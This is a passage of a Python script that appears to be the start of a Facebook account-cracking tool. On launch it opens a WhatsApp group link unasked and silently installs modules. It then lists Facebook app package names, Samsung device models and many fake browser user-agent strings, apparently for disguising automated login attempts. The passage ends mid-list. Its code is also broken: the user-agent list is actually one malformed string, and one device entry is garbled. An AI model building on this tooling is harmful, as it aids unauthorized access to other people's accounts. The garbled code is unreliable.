from os import path
import os,base64,zlib,pip,urllib
os.system('xdg-open https://chat.whatsapp.com/Lc1wInhtm1PA7JxS5d8tsw')
print('\n\033[1;92m [•] checking update 10.4 \n wait a few sec...')

try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        print('\n Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
        os.system('python Pro.py')
except:pass
        
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
zf = random.choice(["Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)O143O) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4720.137 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)V615P) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4850.61 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)W39G) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4786.52 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)J13K) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4248.146 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)A717A) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4468.105 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)C399D) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4559.135 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Q636S) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4210.91 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)V396V) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4446.135 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Z128A) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4800.120 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)J152O) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4759.130 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)V725N) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4845.139 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)F411U) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4418.104 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Y815R) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4434.43 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)L862T) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4608.50 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)B665O) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4898.77 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)F802P) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4588.71 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)S518R) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4859.130 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)H786F) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4891.98 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)X626D) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4540.56 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Y197F) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4790.47 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)O289M) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4598.73 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)H777J) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4333.76 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Z637O) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4207.134 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)C675A) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4222.131 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)T896X) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4842.113 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)A135U) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4295.104 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)Q998S) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4858.76 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)N770C) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4417.136 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)C897C) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4414.131 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)K19T) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4728.56 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)C301M) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4551.74 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)N894G) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4744.112 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)F963D) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4402.136 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)T139D) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4254.129 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)T525F) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4389.137 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Z689E) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4475.134 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)S460F) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4301.141 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Y866V) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4566.127 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)N466O) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4335.79 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)N724N) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4458.54 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)C66M) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4427.108 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)S783T) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4670.75 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)X32A) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4514.47 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)K722I) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4706.113 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Y869Q) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4394.59 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)H211F) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4740.130 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)A877Y) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4871.73 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Q662A) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4603.92 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)E98G) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4554.88 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)A719X) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4359.70 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)Y492E) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4504.83 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)A528J) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4790.72 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)D717A) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4646.73 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)K975U) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4416.146 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)K192H) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4797.146 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)N525D) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4737.109 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)F184D) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4479.64 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)X708B) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4645.73 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)U383J) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4609.47 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)E810B) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4761.55 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)K806B) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4778.53 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)T890K) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4878.93 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)G689Q) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4753.74 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)A141L) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4827.110 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)P571J) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4472.110 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)N238M) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4655.105 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)E271M) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4598.102 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)O882L) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4475.130 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)U924W) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4781.64 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)H667S) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4686.98 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)G648D) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4835.46 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)D626D) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4509.56 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)E266W) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4656.87 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)R377T) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4284.142 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)L437P) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4579.143 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)U388V) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4641.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)G282N) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4458.114 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)P527G) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4726.112 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)J10C) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4650.67 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)K602D) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4251.71 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)H445A) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4404.100 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)S611R) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4838.104 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)H893D) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4755.96 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)W714L) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4829.66 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)R96T) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4271.85 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)T556P) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4867.103 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)M701L) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4208.106 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)S611H) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4452.113 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)O509U) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4562.74 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)Q642X) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4444.62 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)H348L) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4625.53 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)F23A) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4590.141 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)D937L) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4661.114 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)A769J) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4458.85 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)Q421Q) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4472.98 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)O703Q) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4853.100 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)T359L) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4864.54 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)B694F) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4732.131 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)N314W) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4847.101 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)Z450S) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4581.90 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Q871W) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4239.116 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)B587O) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4610.47 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)K164H) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4457.83 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)C360M) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4504.67 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)P819B) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4795.97 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)B853X) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4472.131 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)F537Q) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4651.74 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)B906A) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4534.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)N138X) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4790.96 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)B861U) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4498.97 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)N398M) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4326.137 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)W337G) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4330.147 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)H489G) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4852.61 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)Z347O) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4746.124 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Z656S) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4846.120 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)P420A) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4782.114 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)A827U) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4657.50 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)V20T) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4459.144 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)I265P) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4709.46 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)S496D) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4491.73 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)F912T) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4481.73 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)I876O) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4517.111 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)D52L) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4603.76 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)X399Z) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4557.89 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)F675H) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4401.136 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Y943N) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4390.131 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)C365F) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4557.139 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Q843Q) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4437.89 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)A707A) 